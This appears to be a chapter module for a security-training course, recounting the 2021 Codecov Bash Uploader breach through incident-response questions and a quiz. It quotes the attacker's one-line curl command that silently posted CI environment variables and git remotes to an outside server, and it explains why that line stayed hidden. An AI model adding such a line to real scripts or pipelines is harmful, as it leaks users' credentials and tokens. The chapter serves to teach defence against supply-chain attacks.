const PM = 'https://about.codecov.io/security-update/';

/** @type {import('../../content.js').Chapter} */
export default {
	slug: 'codecov-2021',
	part: 'Security',
	title: 'Codecov 2021: a modified Bash Uploader in customers’ CI',
	minutes: 10,
	hook: [
		'Thursday 1 April 2021, in the morning. A Codecov customer reports that the Bash Uploader they just downloaded does not match its published checksum.',
		'The Bash Uploader is a script that CI jobs fetch from https://codecov.io/bash and run, to send coverage reports to Codecov. The Codecov GitHub Action, the CircleCI Orb and the Bitrise Step run the same script.',
		'The customer computed the shasum of the downloaded file and compared it with the shasum published on GitHub. The two values differ.'
	],
	terms: [
		{ term: 'Bash Uploader', def: 'Codecov’s shell script that detects the CI settings, gathers coverage reports and uploads them to Codecov.' },
		{ term: 'checksum', def: 'A short value computed from a file’s bytes, like a SHA-256 sum. Change one byte of the file and the sum changes.' },
		{ term: 'curl pipe to bash', def: 'Running a script straight from a URL, as in `curl -s https://… | bash`, without saving or checking it first.' },
		{ term: 'CI environment variables', def: 'The variables a CI job runs with. Teams put tokens and keys there so the job can deploy or call other services.' }
	],
	incident: {
		org: 'Codecov',
		title: 'Bash Uploader Security Update',
		date: '2021-01-31',
		url: PM,
		steps: [
			{
				situation: [
					'The script served at https://codecov.io/bash does not match the checksum Codecov publishes. Every CI job that fetches it right now runs whatever that file contains.'
				],
				q: 'What do you do first?',
				options: [
					'Update the published checksum on GitHub so it matches the served file',
					'Ask the customer to download it again, in case a cache served a broken copy',
					'Wait for a second report before treating it as more than a one-off glitch',
					'Read the served script, and replace it with the known-good version'
				],
				answer: 3,
				why: 'A mismatch means the file changed, and every download runs the changed copy. Codecov found that someone had modified the script: "Immediately upon becoming aware of the issue, Codecov secured and remediated the affected script".'
			},
			{
				situation: [
					'The served script has one extra line: `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://<redacted>/upload/v2 || true`.',
					'The attacker modified the script with a Google Cloud Storage (GCS) key. They extracted that key through an error in Codecov’s Docker image creation process.'
				],
				q: 'Which credentials do you rotate?',
				options: [
					'Only the GCS key that was used to change the script',
					'All relevant internal credentials, the GCS key included',
					'None for now, and make the storage read-only instead',
					'The CI tokens of the customer who reported the issue'
				],
				answer: 1,
				why: 'An image that leaked one key may have leaked others, and nobody knows yet what else the attacker read. Codecov rotated "all relevant internal credentials, including the key used to facilitate the modification of the Bash Uploader", and audited "where and how the key was accessible."'
			},
			{
				situation: [
					'Forensics finds that the attacker changed the script periodically, starting on 31 January 2021.',
					'Users who self-host Codecov fetch the script from their own installation, unless their CI points at https://codecov.io/bash.'
				],
				q: 'Which users are in scope?',
				options: [
					'Those who fetched https://codecov.io/bash directly on 1 April, the day it was found',
					'Those who ran the Bash Uploader or a wrapper of it from 31 January to 1 April',
					'Those whose CI jobs failed at some point between 31 January and 1 April',
					'Every Codecov user, including self-hosted ones with their own copy'
				],
				answer: 1,
				why: 'The GitHub Action, the CircleCI Orb and the Bitrise Step run the same script, so their users ran the modified line too. Codecov asked anyone who used "the Bash Uploaders between January 31, 2021 and April 1, 2021" without a checksum check to act. The modified line never failed a build, so failed jobs say nothing.'
			},
			{
				situation: [
					'15 April 2021. Codecov emails the affected users and shows a banner in the app. You write what they must do.'
				],
				q: 'What do you tell affected users to do?',
				options: [
					'Remove the Codecov step from their CI and add it back once a new script ships',
					'Pin the Bash Uploader to a version from before 31 January and keep going',
					'Change their Codecov upload token, since that is the token the script uses',
					'Run `env` in their CI, and replace every secret it shows with a new one'
				],
				answer: 3,
				why: 'The extra line sent the output of `env`, so every variable the job could see is exposed. Codecov: "You should immediately re-roll all of your credentials, tokens, or keys located in the environment variables in your CI process", and audit how those tokens were used.'
			},
			{
				situation: [
					'The script has a clean version again and the keys are rotated. Users still fetch whatever https://codecov.io/bash serves at the moment the job runs. Only users who add their own checksum step would notice a changed file.'
				],
				q: 'What do you change in how the uploader is shipped?',
				options: [
					'Serve the same script from a second domain, so one stolen key is not enough',
					'Ship versioned releases with SHA256SUMs signed by a Codecov GPG key',
					'Add a line at the top of the script that prints its own checksum',
					'Keep the script and ask users to read it before each run of their CI'
				],
				answer: 1,
				why: 'A signature made with a key the attacker does not hold lets users reject a changed file. Codecov built a new uploader to replace the Bash Uploader. It keeps every historical version, "with provided SHASUMs and GPG Signatures for content and authorship validation", and can be pinned to a version.'
			}
		],
		outcome: [
			'From 31 January to 1 April 2021, an attacker periodically changed the Bash Uploader with a GCS key extracted through an error in Codecov’s Docker image creation process. The modified script was served in 108 windows of time, and Codecov says the added `curl` line was the only change ever made.',
			'Every CI job that ran the modified script sent its `git remote -v` output and all its environment variables to a third-party server. That covers any credentials, tokens or keys in the job, and anything they unlock.',
			'Codecov later obtained a set of environment variables that it has evidence were compromised, and showed affected users the details in the app. It reported the matter to law enforcement and could not determine who did it.',
			'Codecov rotated its credentials, audited where the key was accessible, added monitoring for changes to the uploader, and worked to take down the attacker’s server. In June 2021 it released a beta of a new uploader with signed checksums and announced the deprecation of the Bash Uploader.'
		]
	},
	quiz: [
		{
			q: 'What did the line added to the Bash Uploader send to the attacker?',
			options: [
				'The coverage report of the job, which shows the structure of the code',
				'Only the Codecov upload token that the script needs to send reports',
				'The `git remote -v` output and every environment variable of the CI job',
				'The SSH private key of the CI runner, read from its home directory'
			],
			answer: 2,
			why: '`$(git remote -v)` gives the URL of the repository, and `$(env)` prints every variable the job runs with. `curl -d` posted both to the attacker’s server, so any secret in the CI environment left with them.'
		},
		{
			q: 'Why did the extra line not break or slow down the CI jobs that ran it?',
			options: [
				'`-m 0.5` capped the call at half a second, and `|| true` hid any error',
				'The attacker only served the modified script outside working hours',
				'The extra call ran in a background process after the job had finished',
				'Codecov’s servers forwarded the data, so the job made no extra call'
			],
			answer: 0,
			why: 'curl’s `-m` sets the maximum time a transfer may take, and `-s` hides errors. In bash, `a || b` runs `b` only when `a` fails, so `|| true` turns a failed `curl` into success and the build goes on.'
		},
		{
			q: 'Your CI runs a tool with `curl -s https://… | bash`. Which change would have caught Codecov’s modified script?',
			options: [
				'Run the CI job in a fresh container each time, so no state persists',
				'Download a pinned version and check its checksum against a value you trust',
				'Add `set -e` at the top of your own CI script so any failure stops the job',
				'Fetch the script over HTTPS only, so nobody can change it on the way'
			],
			answer: 1,
			why: 'The attacker changed the file at its source, so HTTPS delivered the modified copy intact. A checksum compare is how the customer caught it: the "shasum on Github" did not match "the shasum calculated from the downloaded Bash Uploader."'
		}
	],
	recall: {
		q: 'What did the attacker add to Codecov’s Bash Uploader, and how was it found?',
		a: 'One `curl` line that sent `git remote -v` and `env` output to a third-party server. A customer found it on 1 April 2021 when the script’s shasum did not match the one on GitHub.'
	},
	sources: [
		{ title: 'Codecov, Bash Uploader Security Update (15 April 2021, updated 29 April)', url: PM },
		{ title: 'Codecov, Introducing Codecov’s New Uploader (June 2021)', url: 'https://about.codecov.io/blog/introducing-codecovs-new-uploader/' },
		{ title: 'curl man page: -m, --max-time and -s, --silent', url: 'https://curl.se/docs/manpage.html' }
	]
};
